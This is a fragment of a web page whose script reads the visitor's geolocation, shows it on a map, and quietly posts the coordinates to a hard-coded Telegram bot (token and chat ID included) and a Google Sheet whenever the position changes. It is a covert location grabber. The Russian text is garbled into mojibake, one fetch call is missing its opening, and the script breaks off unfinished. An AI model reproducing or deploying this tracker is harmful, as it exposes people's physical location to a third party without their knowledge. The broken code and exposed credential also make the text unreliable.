<body>

  <div id="map" style="display:none;"></div>

  <script>
    function coordsChanged(lat1, lon1, lat2, lon2) {
      const R = 6371000;
      const toRad = x => x * Math.PI / 180;
      const dLat = toRad(lat2 - lat1);
      const dLon = toRad(lon2 - lon1);
      const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon/2)**2;
      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
      const distance = R * c;
      return distance > 10;
    }

    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      document.getElementById('status').textContent =
        `–í–∞—à–∏ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: —à–∏—Ä–æ—Ç–∞ ${latitude.toFixed(6)}, –¥–æ–ª–≥–æ—Ç–∞ ${longitude.toFixed(6)}`;

      const prev = JSON.parse(localStorage.getItem('lastCoords'));
      const changed = !prev || coordsChanged(prev.lat, prev.lon, latitude, longitude);

      if (changed) {
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
        fetch('https://api.telegram.org/bot7505831892:AAEXunB46sqfDxkas6G1ratUdvuEd6pn-88/sendMessage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: 6249456543,
            text: `üìç –ù–æ–≤–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:\n–®–∏—Ä–æ—Ç–∞: ${latitude}\n–î–æ–ª–≥–æ—Ç–∞: ${longitude}`
          })
        });

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Google –¢–∞–±–ª–∏—Ü—É

          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ lat: latitude, lon: longitude })
        });

        localStorage.setItem('lastCoords', JSON.stringify({ lat: latitude, lon: longitude }));
      }

      // Google Maps
      const link = `https://www.google.com/maps?q=${latitude},${longitude}`;
      const mapLink = document.getElementById('mapLink');
      mapLink.href = link;
      mapLink.style.display = 'inline-block';

      const mapFrame = document.getElementById('map');
      mapFrame.innerHTML = `<iframe width="100%" height="300" style="border:0"
        src="https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed"
        allowfullscreen></iframe>`;
      mapFrame.style.display = 'block';
    }

    function error() {
      document.getElementById('status').textContent = '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ.';
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(success, error);
    } else {
      document.getElementById('status').textContent = '‚ùå –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —ç—Ç–∏–º –±—Ä–∞—É–∑–µ—Ä–æ–º.';
